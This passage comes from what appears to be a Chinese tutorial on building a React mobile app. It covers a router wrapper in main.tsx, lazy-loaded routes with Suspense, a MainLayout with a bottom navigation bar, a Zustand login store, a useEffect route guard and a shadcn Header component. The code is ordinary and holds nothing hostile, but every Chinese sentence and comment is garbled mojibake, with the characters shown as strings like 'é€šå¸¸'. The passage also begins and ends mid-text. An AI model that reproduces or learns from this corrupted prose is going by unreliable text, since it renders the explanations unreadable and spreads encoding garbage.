é€šå¸¸æˆ‘ä»¬ä¼šæŠŠ <code>&lt;Router&gt;</code> åŒ…è£¹åœ¨æœ€å¤–å±‚ã€‚åœ¨æœ¬é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬é€‰æ‹©åœ¨ <code>main.tsx</code> ä¸­åŒ…è£¹ <code>App</code> ç»„ä»¶ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆï¼Ÿ</strong>
å› ä¸ºæˆ‘ä»¬å¸Œæœ›åœ¨ <code>App.tsx</code> ä¸­ä½¿ç”¨ <code>useNavigate</code> æˆ– <code>useLocation</code> ç­‰ Hooks æ¥åšå…¨å±€çš„æƒé™æ§åˆ¶ï¼ˆæ¯”å¦‚æœªç™»å½•è·³è½¬ï¼‰ã€‚<strong>è¿™äº› Hooks å¿…é¡»åœ¨ Router çš„ä¸Šä¸‹æ–‡ï¼ˆContextï¼‰å†…éƒ¨æ‰èƒ½è¿è¡Œã€‚</strong>
å¦‚æœ <code>App.tsx</code> è‡ªå·±æ¸²æŸ“ <code>&lt;Router&gt;</code>ï¼Œé‚£å®ƒè‡ªå·±å°±ä¸åœ¨ Router å†…éƒ¨ï¼Œå°±ç”¨ä¸äº†è¿™äº› Hooksã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨ <code>main.tsx</code> è¿™æ ·åšï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { createRoot } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom/client'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">RouterConfig</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/router/index.tsx'</span> <span class="hljs-comment">// å¼•å…¥æˆ‘ä»¬å°è£…çš„ Router ç»„ä»¶</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./index.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.tsx'</span>

<span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'root'</span>)!).<span class="hljs-title function_">render</span>(
  <span class="hljs-comment">// RouterConfig å†…éƒ¨åŒ…å«äº† &lt;BrowserRouter&gt;</span>
  <span class="hljs-comment">// App ä½œä¸º children ä¼ å…¥ï¼Œè¿™æ · App å°±åœ¨ Router å†…éƒ¨äº†</span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">RouterConfig</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">RouterConfig</span>&gt;</span></span>,
)
</code></pre>
<h3 data-id="heading-9">3.3 è·¯ç”±é…ç½®ï¼šæ‡’åŠ è½½ä¸ Suspense</h3>
<p>æ‰“å¼€ <code>src/router/index.tsx</code>ï¼Œè¿™é‡Œæ˜¯æˆ‘ä»¬åº”ç”¨çš„äº¤é€šæ¢çº½ã€‚</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Suspense</span>, lazy } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BrowserRouter</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">Router</span>, <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Loading</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/Loading'</span>; <span class="hljs-comment">// è‡ªå®šä¹‰çš„ Loading ç»„ä»¶</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MainLayout</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/layouts/MainLayout'</span>;

<span class="hljs-comment">// ğŸš€ è·¯ç”±æ‡’åŠ è½½ (Lazy Loading)</span>
<span class="hljs-comment">// åªæœ‰å½“ç”¨æˆ·è®¿é—®è¿™ä¸ªé¡µé¢æ—¶ï¼Œæµè§ˆå™¨æ‰ä¼šå»ä¸‹è½½è¿™ä¸ªé¡µé¢çš„ JS ä»£ç ã€‚</span>
<span class="hljs-comment">// è¿™å¯¹äºç§»åŠ¨ç«¯åº”ç”¨è‡³å…³é‡è¦ï¼Œèƒ½æå¤§æå‡é¦–å±åŠ è½½é€Ÿåº¦ã€‚</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Home</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Home'</span>));
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Mine</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Mine'</span>));
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Login</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Login'</span>));
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Order</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Order'</span>))
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Chat</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Chat'</span>))

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">RouterConfig</span>(<span class="hljs-params">{children}: {children?: React.ReactNode}</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Router</span>&gt;</span>
      {/* Suspense æ˜¯ React çš„å†…ç½®ç»„ä»¶ï¼Œç”¨äºå¤„ç†å¼‚æ­¥åŠ è½½çš„çŠ¶æ€ */}
      {/* fallback å±æ€§æ¥å—ä¸€ä¸ªç»„ä»¶ï¼Œåœ¨é¡µé¢è¿˜æ²¡åŠ è½½å‡ºæ¥æ—¶æ˜¾ç¤ºï¼ˆæ¯”å¦‚è½¬åœˆåœˆï¼‰ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Loading</span>/&gt;</span>}&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/login"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Login</span> /&gt;</span>}/&gt;
          
          {/* ğŸ“¦ åµŒå¥—è·¯ç”±å¸ƒå±€ */}
          {/* MainLayout åŒ…å«äº†åº•éƒ¨çš„å¯¼èˆªæ ï¼Œæ‰€æœ‰å­è·¯ç”±éƒ½ä¼šæ˜¾ç¤ºåœ¨è¿™ä¸ªå¸ƒå±€é‡Œ */}
          <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">MainLayout</span>/&gt;</span>}&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">""</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>} /&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"mine"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Mine</span> /&gt;</span>} /&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"order"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Order</span> /&gt;</span>} /&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"chat"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Chat</span> /&gt;</span>} /&gt;
          <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>
      {/* æ¸²æŸ“ä¼ å…¥çš„å­ç»„ä»¶ (App.tsx) */}
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">Router</span>&gt;</span></span>
  )
}
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬å¤ä¹ äº†å‡ ä¸ªæ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼š</p>
<ol>
<li><strong><code>lazy</code></strong>: åŠ¨æ€å¯¼å…¥ç»„ä»¶ã€‚</li>
<li><strong><code>Suspense</code></strong>: å¿…é¡»é…åˆ <code>lazy</code> ä½¿ç”¨ï¼Œæä¾›åŠ è½½æ—¶çš„å ä½ç¬¦ã€‚æˆ‘ä»¬è¿™é‡Œå†™äº†ä¸€ä¸ª <code>Loading</code> ç»„ä»¶ï¼ˆè™½ç„¶ä»£ç ç®€å•ï¼Œä½†æå‡äº†ä½“éªŒï¼‰ã€‚</li>
<li><strong>åµŒå¥—è·¯ç”±</strong>: <code>&lt;Route path="/" element={&lt;MainLayout/&gt;}&gt;</code>ã€‚è¿™æ„å‘³ç€ <code>Home</code>, <code>Mine</code> ç­‰é¡µé¢éƒ½ä¼šä½œä¸º <code>MainLayout</code> çš„å­å…ƒç´ æ¸²æŸ“ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-10">ğŸ§­ å››ã€ å¯¼èˆªç³»ç»Ÿï¼šMainLayout ä¸ BottomNav</h2>
<h3 data-id="heading-11">4.1 å¸ƒå±€å®¹å™¨ (MainLayout)</h3>
<p><code>src/layouts/MainLayout.tsx</code> å……å½“äº†é¡µé¢çš„éª¨æ¶ã€‚</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Outlet</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">BottomNav</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/BottomNav'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">MainLayout</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"min-h-screen bg-gray-50 pb-16"</span>&gt;</span>
      {/* ğŸ“º Outlet æ˜¯å­è·¯ç”±çš„å‡ºå£ */}
      {/* å½“ URL æ˜¯ /mine æ—¶ï¼Œ<span class="hljs-tag">&lt;<span class="hljs-name">Mine</span> /&gt;</span> å°±ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"h-full w-full"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Outlet</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      {/* åº•éƒ¨å¯¼èˆªæ ï¼Œæ°¸è¿œå›ºå®šåœ¨åº•éƒ¨ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">BottomNav</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h3 data-id="heading-12">4.2 æ™ºèƒ½åº•æ  (BottomNav)</h3>
<p>è¿™æ˜¯æœ¬é¡¹ç›®çš„äº®ç‚¹ä¹‹ä¸€ã€‚æˆ‘ä»¬æ²¡æœ‰æŠŠå¯¼èˆªå†™æ­»ï¼Œè€Œæ˜¯ç”¨<strong>é…ç½®åŒ–</strong>çš„æ–¹å¼ã€‚
æ‰“å¼€ <code>src/components/BottomNav.tsx</code>ã€‚</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Home</span>, <span class="hljs-title class_">User</span>, <span class="hljs-title class_">ListOrdered</span>, <span class="hljs-title class_">MessageCircle</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'lucide-react'</span>; <span class="hljs-comment">// æ¼‚äº®çš„å›¾æ ‡åº“</span>
<span class="hljs-keyword">import</span> { useNavigate, useLocation } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;
<span class="hljs-keyword">import</span> { cn } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/lib/utils'</span>; <span class="hljs-comment">// shadcn æä¾›çš„ç±»ååˆå¹¶å·¥å…·</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store/useUserStore'</span>
<span class="hljs-keyword">import</span> { needsLoginPath } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/App'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">BottomNav</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> navigate  = <span class="hljs-title function_">useNavigate</span>();
  <span class="hljs-keyword">const</span> { pathname } = <span class="hljs-title function_">useLocation</span>(); <span class="hljs-comment">// è·å–å½“å‰è·¯å¾„</span>
  <span class="hljs-keyword">const</span> { isLogin } = <span class="hljs-title function_">useUserStore</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state); <span class="hljs-comment">// ä» Zustand è·å–ç™»å½•çŠ¶æ€</span>

  <span class="hljs-comment">// ğŸ“ é…ç½®æ•°ç»„ï¼šæƒ³åŠ æ–°èœå•ï¼Ÿåœ¨è¿™é‡ŒåŠ ä¸€ä¸ªå¯¹è±¡å°±è¡Œäº†ï¼</span>
  <span class="hljs-keyword">const</span> tabs = [
    { <span class="hljs-attr">label</span>: <span class="hljs-string">"é¦–é¡µ"</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">"/"</span>, <span class="hljs-attr">icon</span>: <span class="hljs-title class_">Home</span> },
    { <span class="hljs-attr">label</span>: <span class="hljs-string">"èŠå¤©"</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">"/chat"</span>, <span class="hljs-attr">icon</span>: <span class="hljs-title class_">MessageCircle</span> },
    { <span class="hljs-attr">label</span>: <span class="hljs-string">"è®¢å•"</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">"/order"</span>, <span class="hljs-attr">icon</span>: <span class="hljs-title class_">ListOrdered</span> },
    { <span class="hljs-attr">label</span>: <span class="hljs-string">"æˆ‘çš„"</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">"/mine"</span>, <span class="hljs-attr">icon</span>: <span class="hljs-title class_">User</span> }
  ]

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNav</span> = (<span class="hljs-params">path: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-comment">// 1. å¦‚æœç‚¹å‡»çš„æ˜¯å½“å‰é¡µé¢ï¼Œå•¥ä¹Ÿä¸åš</span>
    <span class="hljs-keyword">if</span> (path === pathname) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// 2. ğŸ›¡ï¸ æƒé™å®ˆå«ï¼šå¦‚æœç›®æ ‡é¡µé¢éœ€è¦ç™»å½•ï¼Œä¸”ç”¨æˆ·æœªç™»å½•</span>
    <span class="hljs-keyword">if</span> (needsLoginPath.<span class="hljs-title function_">includes</span>(path) &amp;&amp; !isLogin) {
      <span class="hljs-title function_">navigate</span>(<span class="hljs-string">"/login"</span>); <span class="hljs-comment">// è¸¢å»ç™»å½•é¡µ</span>
      <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// 3. æ­£å¸¸è·³è½¬</span>
    <span class="hljs-title function_">navigate</span>(path);
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"fixed bottom-0 left-0 right-0 h-16 border-t bg-background flex items-center justify-around z-50 safe-area-bottom"</span>&gt;</span>
    {
      tabs.map((tab) =&gt; {
        const Icon = tab.icon;
        // åˆ¤æ–­å½“å‰ tab æ˜¯å¦è¢«æ¿€æ´»
        const isActive = pathname === tab.path;

        return (
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
            <span class="hljs-attr">key</span>=<span class="hljs-string">{tab.path}</span>
            <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> handleNav(tab.path)}
            className="flex flex-col items-center justify-center w-full h-full space-y-1"
          &gt;
            {/* å›¾æ ‡å˜è‰²é€»è¾‘ */}
            <span class="hljs-tag">&lt;<span class="hljs-name">Icon</span> 
              <span class="hljs-attr">size</span>=<span class="hljs-string">{24}</span> 
              <span class="hljs-attr">className</span>=<span class="hljs-string">{cn(</span>"<span class="hljs-attr">transition-colors</span>", 
                <span class="hljs-attr">isActive</span> ? "<span class="hljs-attr">text-primary</span>" <span class="hljs-attr">:</span> "<span class="hljs-attr">text-muted-foreground</span>"
              )}
            /&gt;</span>
            {/* æ–‡å­—å˜è‰²é€»è¾‘ */}
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{cn(</span>"<span class="hljs-attr">text-xs</span> <span class="hljs-attr">transition-colors</span>", 
              <span class="hljs-attr">isActive</span> ? "<span class="hljs-attr">text-primary</span> <span class="hljs-attr">font-medium</span>"<span class="hljs-attr">:</span> "<span class="hljs-attr">text-muted-foreground</span>")}&gt;</span>
              {tab.label}
            <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        )
      })
    }
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<p><strong>ğŸ’¡ æ ¸å¿ƒé€»è¾‘è§£æï¼š</strong></p>
<ol>
<li><strong>Icon Component</strong>: <code>const Icon = tab.icon;</code> React å…è®¸æˆ‘ä»¬å°†ç»„ä»¶ä½œä¸ºå˜é‡ä¼ é€’ã€‚</li>
<li><strong><code>cn()</code> å‡½æ•°</strong>: è¿™æ˜¯ shadcn æä¾›çš„ä¸€ä¸ªç¥çº§å·¥å…·ï¼ˆåŸºäº <code>clsx</code> å’Œ <code>tailwind-merge</code>ï¼‰ã€‚å®ƒå¯ä»¥è®©ä½ åŠ¨æ€æ‹¼æ¥ç±»åï¼Œå¹¶ä¸”è‡ªåŠ¨è§£å†³ Tailwind ç±»åå†²çªçš„é—®é¢˜ã€‚
<ul>
<li>æ¯”å¦‚ï¼š<code>cn("bg-red-500", isActive &amp;&amp; "bg-blue-500")</code>ã€‚</li>
</ul>
</li>
<li><strong>æƒé™æ§åˆ¶</strong>: æˆ‘ä»¬å¼•å…¥äº† <code>needsLoginPath</code> æ•°ç»„ï¼ˆç¨ååœ¨ App.tsx å®šä¹‰ï¼‰ï¼Œå¦‚æœç”¨æˆ·æ²¡ç™»å½•æƒ³ç‚¹â€œæˆ‘çš„â€ï¼Œç›´æ¥æ‹¦æˆªã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-13">ğŸ” äº”ã€ å…¨å±€çŠ¶æ€ä¸æƒé™å®ˆå«</h2>
<h3 data-id="heading-14">5.1 çŠ¶æ€ä»“åº“ (Zustand)</h3>
<p>å¤ä¹ ä¸€ä¸‹ Zustandã€‚åœ¨ <code>src/store/useUserStore.ts</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { create } <span class="hljs-keyword">from</span> <span class="hljs-string">'zustand'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">User</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/types'</span>; <span class="hljs-comment">// å¼•å…¥ç±»å‹å®šä¹‰</span>

<span class="hljs-comment">// 1. å®šä¹‰ Store çš„å½¢çŠ¶ (Interface)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserStore</span> {
    <span class="hljs-attr">isLogin</span>: <span class="hljs-built_in">boolean</span>;
    <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> | <span class="hljs-literal">null</span>; <span class="hljs-comment">// User æˆ–è€…æ˜¯ null</span>
}

<span class="hljs-comment">// 2. åˆ›å»º Store</span>
<span class="hljs-comment">// create&lt;UserStore&gt; ä½¿ç”¨æ³›å‹çº¦æŸï¼Œä¿è¯ä»£ç æç¤ºå’Œç±»å‹å®‰å…¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = create&lt;<span class="hljs-title class_">UserStore</span>&gt;(<span class="hljs-function">(<span class="hljs-params">set</span>) =&gt;</span> ({
    <span class="hljs-attr">isLogin</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// é»˜è®¤æœªç™»å½•</span>
    <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span>
}))
</code></pre>
<p>ç®€å•ã€çº¯ç²¹ã€‚æ²¡æœ‰ Redux é‚£äº›å¤æ‚çš„æ ·æ¿ä»£ç ã€‚</p>
<h3 data-id="heading-15">5.2 å…¨å±€è·¯ç”±å®ˆå« (App.tsx)</h3>
<p>è™½ç„¶æˆ‘ä»¬åœ¨ <code>BottomNav</code> é‡Œåšäº†æ‹¦æˆªï¼Œä½†å¦‚æœç”¨æˆ·ç›´æ¥åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ <code>/mine</code> æ€ä¹ˆåŠï¼Ÿ
æˆ‘ä»¬éœ€è¦åœ¨ <code>App.tsx</code> é‡Œåšä¸€ä¸ªå…¨å±€çš„â€œå®‰æ£€é—¨â€ã€‚</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store/useUserStore'</span>
<span class="hljs-keyword">import</span> { useNavigate, useLocation } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">BackToTop</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/BackToTop'</span>;

<span class="hljs-comment">// å¯¼å‡ºéœ€è¦ç™»å½•æ‰èƒ½è®¿é—®çš„è·¯å¾„åˆ—è¡¨ï¼Œä¾›å…¶ä»–ç»„ä»¶ï¼ˆå¦‚ BottomNavï¼‰ä½¿ç”¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> needsLoginPath = [<span class="hljs-string">'/mine'</span>,<span class="hljs-string">'/order'</span>,<span class="hljs-string">'/chat'</span>]

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { isLogin } = <span class="hljs-title function_">useUserStore</span>();
  <span class="hljs-keyword">const</span> navigate = <span class="hljs-title function_">useNavigate</span>();
  <span class="hljs-keyword">const</span> { pathname } = <span class="hljs-title function_">useLocation</span>();

  <span class="hljs-comment">// ğŸ›¡ï¸ useEffect ç›‘å¬å™¨</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// å¦‚æœæœªç™»å½• ä¸” å½“å‰è·¯å¾„åœ¨å—ä¿æŠ¤åˆ—è¡¨é‡Œ</span>
    <span class="hljs-keyword">if</span>(!isLogin &amp;&amp; needsLoginPath.<span class="hljs-title function_">includes</span>(pathname)) {
      <span class="hljs-title function_">navigate</span>(<span class="hljs-string">'/login'</span>) <span class="hljs-comment">// å¼ºåˆ¶è·³è½¬ç™»å½•é¡µ</span>
    }
  }, [isLogin, navigate, pathname]) <span class="hljs-comment">// ä¾èµ–é¡¹ï¼šä»»ä½•ä¸€ä¸ªå˜åŒ–éƒ½ä¼šè§¦å‘æ£€æŸ¥</span>

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      {/* è¿™é‡Œçš„ BackToTop æ˜¯å…¨å±€ç»„ä»¶ï¼Œæ‰€æœ‰é¡µé¢éƒ½æœ‰ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">BackToTop</span>/&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>
</code></pre>
<p><strong>ğŸ’¡ ä¸ºä»€ä¹ˆç”¨ useEffectï¼Ÿ</strong>
React çš„ç»„ä»¶æ¸²æŸ“æ˜¯çº¯å‡½æ•°ï¼Œä¸èƒ½ç›´æ¥åœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­æ‰§è¡Œè·³è½¬ï¼ˆSide Effectï¼‰ã€‚å¿…é¡»æ”¾åœ¨ <code>useEffect</code> ä¸­ï¼Œç­‰ç»„ä»¶æŒ‚è½½æˆ–æ›´æ–°åå†æ‰§è¡Œé€»è¾‘ã€‚</p>
<hr/>
<h2 data-id="heading-16">ğŸ  å…­ã€ é¦–é¡µå¼€å‘ï¼šshadcn å®æˆ˜</h2>
<p>ç»ˆäºåˆ°äº†ç”»é¡µé¢çš„æ—¶å€™äº†ï¼æˆ‘ä»¬å°†ä½¿ç”¨ shadcn çš„ <code>Card</code> ç»„ä»¶æ¥å¿«é€Ÿæ­å»ºé¦–é¡µã€‚</p>
<h3 data-id="heading-17">6.1 é€šç”¨å¤´éƒ¨ç»„ä»¶ (Header)</h3>
<p>å…ˆå†™ä¸€ä¸ªé€šç”¨çš„ <code>Header.tsx</code>ã€‚</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>; 
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ui/button'</span>; <span class="hljs-comment">// å¤ç”¨ shadcn çš„ Button</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ArrowLeft</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'lucide-react'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HeaderProps</span> {
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;
  showBackBtn?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// å¯é€‰å±æ€§</span>
  onBackClick?:<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">Header</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">HeaderProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{
  title,
  showBackBtn = <span class="hljs-literal">false</span>, // é»˜è®¤ä¸æ˜¾ç¤ºè¿”å›æŒ‰é’®
  onBackClick = () =&gt; <span class="hljs-variable language_">window</span>.history.back() // é»˜è®¤è¡Œä¸ºï¼šæµè§ˆå™¨åé€€
}</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex items-center justify-center h-16 px-4 border-b bg-white sticky top-0 z-40"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"absolute left-4"</span>&gt;</span>
      {
        showBackBtn &amp;&amp; (
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"ghost"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onBackClick}</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ArrowLeft</span> <span class="hljs-attr">size</span>=<span class="hljs-string">{20}/</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        )
      }
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-lg font-semibold truncate max-w-[60%] text-center"</span>&gt;</span>
        {title}
      <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span>
  )
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">Header</span>
</code></pre>
<h3 data-id="heading-18">6.2 é¦–é¡µ (Home.tsx)</h3>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/Header'</span>;
